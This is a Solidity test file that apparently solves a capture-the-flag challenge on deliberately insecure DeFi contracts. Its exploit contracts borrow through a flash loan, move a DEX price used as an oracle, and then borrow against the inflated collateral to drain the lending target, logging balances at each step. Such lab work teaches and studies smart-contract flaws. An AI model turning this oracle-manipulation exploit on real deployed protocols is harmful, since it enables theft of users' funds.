// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";
import {BoringToken} from "../src/tokens/tokenBoring.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InsecureDexLP} from "../src/Challenge2.DEX.sol";
import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
import {BorrowSystemInsecureOracle} from "../src/Challenge3.borrow_system.sol";


contract Challenge3Test is Test {
    // dex & oracle
    InsecureDexLP oracleDex;
    // flash loan
    InSecureumLenderPool flashLoanPool;
    // borrow system, contract target to break
    BorrowSystemInsecureOracle target;

    // insecureum token
    IERC20 token0;
    // boring token
    IERC20 token1;

    address player = makeAddr("player");

    function setUp() public {

        // create the tokens
        token0 = IERC20(new InSecureumToken(30000 ether));
        token1 = IERC20(new BoringToken(20000 ether));
        
        // setup dex & oracle
        oracleDex = new InsecureDexLP(address(token0),address(token1));

        token0.approve(address(oracleDex), type(uint256).max);
        token1.approve(address(oracleDex), type(uint256).max);
        oracleDex.addLiquidity(100 ether, 100 ether);

        // setup flash loan service
        flashLoanPool = new InSecureumLenderPool(address(token0));
        // send tokens to the flashloan pool
        token0.transfer(address(flashLoanPool), 10000 ether);

        // setup the target conctract
        target = new BorrowSystemInsecureOracle(address(oracleDex), address(token0), address(token1));

        // lets fund the borrow
        token0.transfer(address(target), 10000 ether);
        token1.transfer(address(target), 10000 ether);

        vm.label(address(oracleDex), "DEX");
        vm.label(address(flashLoanPool), "FlashloanPool");
        vm.label(address(token0), "InSecureumToken");
        vm.label(address(token1), "BoringToken");

    }

    function testChallenge() public {  

        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/

        //Flashloan Receiver Contract
        ExploitReceiver eReceiver = new ExploitReceiver();
        Exploit exploitContract = new Exploit(address(target), address(oracleDex));

        //init flashloan
        flashLoanPool.flashLoan(
          address(eReceiver),
          abi.encodeWithSignature(
            "getFlashLoan(address,address)", address(exploitContract), address(token0)
          )
        );
        //============================//

        vm.stopPrank();

        assertEq(token0.balanceOf(address(target)), 0, "You should empty the target contract");

    }
}

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/

contract ExploitReceiver {
    function getFlashLoan(address exploitContract, address token0) public {
        IERC20(token0).transfer(exploitContract, IERC20(token0).balanceOf(address(this)));
        Exploit(exploitContract).hack(); //msg.sender -> address(flashLoanPool)
    }
}

contract Exploit {
    IERC20 token0;
    IERC20 token1;
    BorrowSystemInsecureOracle borrowSystem;
    InsecureDexLP dex;

    address player;

    constructor(address _borrowSystem, address _dex){
        borrowSystem = BorrowSystemInsecureOracle(_borrowSystem);
        dex = InsecureDexLP(_dex);
        token0 = IERC20(dex.token0()); //ISEC
        token1 = IERC20(dex.token1()); //BOR

        player = msg.sender;

        //grant approval to the borrowSystem
        token0.approve(_borrowSystem, type(uint256).max);
        token1.approve(_borrowSystem, type(uint256).max);

        //grant approval to the DexLP
        token0.approve(_dex, type(uint256).max);
        token1.approve(_dex, type(uint256).max);
    }

    function logBalance(string memory name, address addr) public {
        console.log("$ISEC Token Balance(",name,"): " , token0.balanceOf(addr));
        console.log("$BOR  Token Balance(",name,"): " , token1.balanceOf(addr));
    }

    function hack() public {
        address flashLoanReceiver = msg.sender; //msg.sender -> address(flashLoanPool)
        uint256 borrowAmount = token0.balanceOf(address(this));

        console.log("BEFORE THE HACK");
        logBalance("Exploiter", address(this));
        logBalance("borrowSystem", address(borrowSystem));
        console.log("_____________________________________________________");
        
        //swap for BOR Tokens from ISEC (10,000 ISEC)
        uint256 _amountToken1 = dex.swap(address(token0), address(token1), 9000 ether);

        console.log("AFTER SWAPPING $ISEC FOR $BOR");
        logBalance("Exploiter", address(this));
        logBalance("borrowSystem", address(borrowSystem));
        console.log("_____________________________________________________");

        borrowSystem.depositToken1(_amountToken1); //deposit BOR to borrowSystem
        
        console.log("AFTER DEPOSIT $BOR TO borrowSystem");
        logBalance("Exploiter", address(this));
        logBalance("borrowSystem", address(borrowSystem));
        console.log("_____________________________________________________");

        borrowSystem.borrowToken0(token0.balanceOf(address(borrowSystem))); //borrow ISEC
        
        console.log("AFTER BORROW $ISEC FROM borrowSystem");
        logBalance("Exploiter", address(this));
        logBalance("borrowSystem", address(borrowSystem));
        console.log("_____________________________________________________");

        //transfer the borrowAmount to FlashLoan Receiver
        //if flashloan is not paid back, Error -> Flash loan hasn't been paid back
        token0.transfer(flashLoanReceiver, borrowAmount);

        //transfer the ISEC tokens to Player
        token0.transfer(player, token0.balanceOf(address(this)));

        console.log("POST HACK");
        logBalance("Player", player);
        logBalance("borrowSystem", address(borrowSystem));
        console.log("_____________________________________________________");

    }
}
